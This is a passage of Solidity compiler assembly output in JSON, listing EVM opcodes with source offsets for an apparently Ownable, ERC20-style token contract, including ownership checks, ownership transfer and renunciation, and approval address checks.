											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "REVERT"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "tag",
											"value": "218"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPDEST"
										},
										{
											"begin": 1856,
											"end": 1857,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "AND"
										},
										{
											"begin": 1836,
											"end": 1844,
											"name": "DUP2"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "AND"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "EQ"
										},
										{
											"begin": 1836,
											"end": 1858,
											"name": "ISZERO"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH [tag]",
											"value": "220"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "JUMPI"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "MLOAD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "MSTORE"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "ADD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP1"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP1"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "ADD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP3"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SUB"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP3"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "MSTORE"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "MSTORE"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "ADD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP1"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH data",
											"value": "245F15FF17F551913A7A18385165551503906A406F905AC1C2437281A7CD0CFE"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SWAP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "CODECOPY"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "ADD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SWAP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "POP"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "POP"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "MLOAD"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "DUP1"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SWAP2"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SUB"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "SWAP1"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "REVERT"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "tag",
											"value": "220"
										},
										{
											"begin": 1814,
											"end": 1924,
											"name": "JUMPDEST"
										},
										{
											"begin": 1971,
											"end": 1979,
											"name": "DUP1"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "AND"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "DUP1"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "SWAP1"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "SLOAD"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "SWAP1"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "EXP"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "SWAP1"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "DIV"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1963,
											"end": 1969,
											"name": "AND"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "AND"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "MLOAD"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "MLOAD"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "DUP1"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "SWAP2"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "SUB"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "SWAP1"
										},
										{
											"begin": 1942,
											"end": 1980,
											"name": "LOG3"
										},
										{
											"begin": 2000,
											"end": 2008,
											"name": "DUP1"
										},
										{
											"begin": 1991,
											"end": 1997,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1991,
											"end": 1997,
											"name": "DUP1"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "EXP"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "DUP2"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "SLOAD"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "DUP2"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "MUL"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "NOT"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "AND"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "SWAP1"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "DUP4"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "AND"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "MUL"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "OR"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "SWAP1"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "SSTORE"
										},
										{
											"begin": 1991,
											"end": 2008,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "tag",
											"value": "141"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "JUMPDEST"
										},
										{
											"begin": 1028,
											"end": 1038,
											"name": "CALLER"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DUP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SLOAD"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "EXP"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DIV"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "EQ"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH [tag]",
											"value": "222"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPI"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "REVERT"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "tag",
											"value": "222"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPDEST"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "DUP1"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "SWAP1"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "SLOAD"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "SWAP1"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "EXP"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "SWAP1"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "DIV"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2153,
											"end": 2159,
											"name": "AND"
										},
										{
											"begin": 2136,
											"end": 2150,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2136,
											"end": 2150,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "EXP"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "DUP2"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "SLOAD"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "DUP2"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "MUL"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "NOT"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "AND"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "SWAP1"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "DUP4"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "AND"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "MUL"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "OR"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "SWAP1"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "SSTORE"
										},
										{
											"begin": 2136,
											"end": 2159,
											"name": "POP"
										},
										{
											"begin": 2187,
											"end": 2188,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2170,
											"end": 2176,
											"name": "DUP1"
										},
										{
											"begin": 2170,
											"end": 2176,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "EXP"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "DUP2"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "SLOAD"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "DUP2"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "MUL"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "NOT"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "AND"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "SWAP1"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "DUP4"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "AND"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "MUL"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "OR"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "SWAP1"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "SSTORE"
										},
										{
											"begin": 2170,
											"end": 2189,
											"name": "POP"
										},
										{
											"begin": 2242,
											"end": 2243,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "AND"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "DUP1"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "SWAP1"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "SLOAD"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "SWAP1"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "EXP"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "SWAP1"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "DIV"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2226,
											"end": 2232,
											"name": "AND"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "AND"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "MLOAD"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "MLOAD"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "DUP1"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "SWAP2"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "SUB"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "SWAP1"
										},
										{
											"begin": 2205,
											"end": 2245,
											"name": "LOG3"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "tag",
											"value": "148"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "JUMPDEST"
										},
										{
											"begin": 7180,
											"end": 7181,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "AND"
										},
										{
											"begin": 7163,
											"end": 7168,
											"name": "DUP4"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "AND"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "EQ"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "ISZERO"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH [tag]",
											"value": "225"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "JUMPI"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MLOAD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP3"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SUB"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP3"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH data",
											"value": "C953F4879035ED60E766B34720F656AAB5C697B141D924C283124ECEDB91C208"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "CODECOPY"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "POP"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "POP"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MLOAD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SUB"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "REVERT"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "tag",
											"value": "225"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "JUMPDEST"
										},
										{
											"begin": 7261,
											"end": 7262,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "AND"
										},
										{
											"begin": 7242,
											"end": 7249,
											"name": "DUP3"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "AND"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "EQ"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "ISZERO"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH [tag]",
											"value": "226"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "JUMPI"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MLOAD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP3"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SUB"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP3"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH data",
											"value": "24883CC5FE64ACE9D0DF1893501ECB93C77180F0FF69CCA79AFFB3C316DC8029"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "CODECOPY"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "POP"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "POP"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MLOAD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SUB"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "REVERT"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "tag",
											"value": "226"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "JUMPDEST"
										},
										{
											"begin": 7345,
											"end": 7350,
											"name": "DUP1"
										},
										{
											"begin": 7315,
											"end": 7326,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7327,
											"end": 7332,
											"name": "DUP6"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7333,
